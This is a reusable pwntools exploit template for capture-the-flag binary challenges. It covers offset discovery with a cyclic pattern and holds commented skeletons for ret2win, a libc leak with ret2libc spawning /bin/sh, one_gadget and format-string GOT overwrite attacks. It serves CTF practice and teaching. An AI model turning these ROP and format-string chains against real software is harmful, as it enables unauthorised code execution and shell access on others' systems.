#!/usr/bin/env python3
"""Reusable pwntools exploit template for CTF.

Usage:
    python3 exploit.py           # local process
    python3 exploit.py GDB       # local + attach gdb/pwndbg
    python3 exploit.py REMOTE    # connect to HOST:PORT

Edit EXE, HOST, PORT, OFFSET and the exploit body.
Deps: sudo pacman -S python-pwntools gdb ; paru -S pwndbg one_gadget-git
"""
from pwn import *

# ---------------- config ----------------
EXE = "./chall"
LIBC = "./libc.so.6"      # set to None if not provided
HOST, PORT = "localhost", 1337
OFFSET = 0                 # bytes to saved return address (find with cyclic)

context.binary = exe = ELF(EXE, checksec=False)
context.terminal = ["tmux", "splitw", "-h"]
libc = ELF(LIBC, checksec=False) if LIBC and os.path.exists(LIBC) else None

GDB_SCRIPT = """
b main
continue
"""


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug(EXE, gdbscript=GDB_SCRIPT)
    return process(EXE)


def find_offset():
    """Crash with a cyclic pattern, then call cyclic_find on the leaked value."""
    io = process(EXE)
    io.sendline(cyclic(400))
    io.wait()
    core = io.corefile
    fault = core.read(core.rsp, 8) if context.bits == 64 else p32(core.eip)
    log.success("offset = %d", cyclic_find(fault[:4]))
    io.close()


# ================= exploit =================
def exploit():
    io = start()

    # --- example: ret2win ---
    # rop = ROP(exe)
    # rop.raw(rop.ret)                 # 16-byte alignment on 64-bit
    # rop.call(exe.sym.win)
    # io.sendlineafter(b":", flat({OFFSET: rop.chain()}))

    # --- example: leak libc via puts, return to main, ret2libc ---
    # rop = ROP(exe)
    # rop.puts(exe.got.puts)
    # rop.call(exe.sym.main)
    # io.sendlineafter(b":", flat({OFFSET: rop.chain()}))
    # leak = u64(io.recvline().strip().ljust(8, b"\x00"))
    # libc.address = leak - libc.sym.puts
    # log.success("libc base: %#x", libc.address)
    # rop2 = ROP(libc)
    # rop2.raw(rop2.ret)
    # rop2.system(next(libc.search(b"/bin/sh")))
    # io.sendlineafter(b":", flat({OFFSET: rop2.chain()}))

    # --- example: one_gadget ---
    # og = libc.address + 0xdeadb     # from: one_gadget ./libc.so.6
    # io.sendlineafter(b":", flat({OFFSET: og}))

    # --- example: format string leak/write ---
    # payload = fmtstr_payload(6, {exe.got.exit: exe.sym.win})
    # io.sendlineafter(b":", payload)

    io.interactive()


if __name__ == "__main__":
    exploit()
